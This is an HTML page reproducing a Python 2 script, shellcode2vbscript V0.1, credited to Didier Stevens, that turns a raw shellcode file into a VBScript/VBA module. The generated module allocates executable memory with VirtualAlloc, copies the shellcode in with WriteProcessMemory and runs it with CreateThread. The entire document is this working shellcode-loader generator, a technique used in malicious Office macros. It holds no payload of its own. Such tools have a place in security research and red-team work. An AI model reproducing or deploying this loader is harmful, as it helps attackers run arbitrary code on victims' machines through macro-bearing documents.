<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>shellcode2vbascript.py</title>
</head><body>#http://www.didierstevens.com/files/software/shellcode2vbscript_v0_1.zip<br/>
#!/usr/bin/python<br/>
<br/>
"""shellcode2vbscript V0.1<br/>
<br/>
tool to create a VBScript containing shellcode to execute<br/>
<br/>
Source code put in public domain by Didier Stevens, no Copyright<br/>
https://DidierStevens.com<br/>
Use at your own risk<br/>
<br/>
History:<br/>
&nbsp; 2008/11/22: V0.1 forked from file2vbscript<br/>
<br/>
"""<br/>
<br/>
import optparse<br/>
<br/>
def Main():<br/>
&nbsp; &nbsp; """Create a VBScript containing shellcode to execute<br/>
&nbsp; &nbsp; """<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; parser = optparse.OptionParser(usage='usage: %prog [options] infile outfile.vbs', version='%prog 0.1')<br/>
&nbsp; &nbsp; (options, args) = parser.parse_args()<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; if len(args) != 2:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; parser.print_help()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print ' &nbsp;Use this program to generate a VBscript containing shellcode to execute'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print ' &nbsp;Source code put in the public domain by Didier Stevens, no Copyright'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print ' &nbsp;Use at your own risk'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print ' &nbsp;https://DidierStevens.com'<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; else:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; infile = open(args[0], 'rb')<br/>
&nbsp; &nbsp; &nbsp; &nbsp; outfile = open(args[1], 'w')<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal lpBuffer As String, ByVal dwSize As Long, ByRef lpNumberOfBytesWritten As Long) As Integer'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Private Declare Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Const MEM_COMMIT = &amp;H1000'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Const PAGE_EXECUTE_READWRITE = &amp;H40'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Private Sub ExecuteShellCode()'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tDim lpMemory As Long'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tDim sShellCode As String'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tDim lResult As Long'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tsShellCode = ShellCode()'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tlpMemory = VirtualAlloc(0&amp;, Len(sShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tlResult = WriteProcessMemory(-1&amp;, lpMemory, sShellCode, Len(sShellCode), 0&amp;)'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tlResult = CreateThread(0&amp;, 0&amp;, lpMemory, 0&amp;, 0&amp;, 0&amp;)'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'End Sub'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; countLine = 0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; countSubs = 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; line = ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Private Function ParseBytes(strBytes) As String'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tDim aNumbers'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tDim sShellCode As String'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tDim iIter'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tsShellCode = ""'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\taNumbers = split(strBytes)'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tfor iIter = lbound(aNumbers) to ubound(aNumbers)'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\t\tsShellCode = sShellCode + Chr(aNumbers(iIter))'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tnext'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tParseBytes = sShellCode'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'End Function'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Private Function ShellCode%d() As String' % countSubs<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tDim sShellCode As String'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tsShellCode = ""'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; while True:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inbyte = infile.read(1)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if not inbyte:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if len(line) &gt; 0:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = line + ' '<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = line + '%d' % ord(inbyte)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if len(line) &gt; 80:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tsShellCode = sShellCode + ParseBytes("%s")' % line<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; countLine += 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if countLine &gt; 99:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; countLine = 0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tShellCode%d = sShellCode' % countSubs<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'End Function'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; countSubs += 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Private Function ShellCode%d() As String' % countSubs<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tDim sShellCode As String'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tsShellCode = ""'<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; if len(line) &gt; 0:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tsShellCode = sShellCode + ParseBytes("%s")' % line<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tShellCode%d = sShellCode' % countSubs<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'End Function'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'Private Function ShellCode() As String'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tDim sShellCode As String'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tsShellCode = ""'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; for iIter in range(1, countSubs+1):<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tsShellCode = sShellCode + ShellCode%d()' % iIter<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, ''<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, '\tShellCode = sShellCode'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print &gt;&gt; outfile, 'End Function'<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; infile.close()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; outfile.close()<br/>
<br/>
if __name__ == '__main__':<br/>
&nbsp; &nbsp; Main()<br/>
</body></html>